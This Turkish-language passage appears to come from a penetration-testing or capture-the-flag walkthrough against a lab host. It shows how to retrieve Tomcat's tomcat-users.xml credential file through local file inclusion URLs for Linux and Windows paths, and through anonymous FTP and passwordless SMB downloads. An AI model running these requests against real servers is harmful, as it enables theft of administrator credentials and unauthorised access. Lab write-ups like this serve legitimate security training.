...
*   **LFI (Local File Inclusion) ile Dosya Okuma:**
    Web uygulamasındaki LFI açığını kullanarak `tomcat-users.xml` dosyasını çekmeye çalışın:
    - *Linux için olası yollar:* `http://10.10.10.6/index.php?file=/usr/share/tomcat/conf/tomcat-users.xml` (veya `/etc/tomcat/tomcat-users.xml`)
    - *Windows için olası yollar:* `http://10.10.10.6/index.php?file=C:\Program Files\Apache Software Foundation\Tomcat 8.5\conf\tomcat-users.xml`
*   **Anonim FTP / SMB Paylaşımı ile:**
    Açık ağ paylaşımları üzerinden dosyayı yerel bilgisayarınıza indirin:
    ```bash
    # FTP Anonymous girişi ile:
    ftp 10.10.10.6 ➔ Kullanıcı: anonymous (Şifre boş) ➔ get tomcat-users.xml
    
    # SMB Şifresiz Paylaşım ile:
    smbclient //10.10.10.6/PaylasimAdi ➔ get tomcat-users.xml
    ```
